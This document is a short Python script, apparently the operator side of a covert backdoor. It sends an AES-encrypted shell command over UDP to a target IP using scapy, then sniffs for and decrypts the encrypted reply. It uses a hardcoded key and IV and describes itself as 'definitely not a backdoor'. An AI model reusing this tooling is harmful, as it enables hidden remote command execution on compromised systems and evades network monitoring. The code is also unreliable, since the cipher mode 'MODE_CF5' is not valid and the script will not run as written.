from scapy.all import *
import argparse
from Crypto.Cipher import AES
import time

def packetFunc(packet):
  encryptedData = packet['Raw'].load
  data = decryptionObject.decrypt(encryptedData)
  print data


parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
encryptionObject = AES.new('This is a key123', AES.MODE_CF5, 'This is an IV456')
decryptionObject = AES.new('This is a key123', AES.MODE_CF5, 'This is an IV456')
encryptedCommand = encryptionObject.encrypt(command)
packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
send(packet)
time.sleep(0.1)
sniff(filter=sniffFilter,prn=packetFunc, count=1)
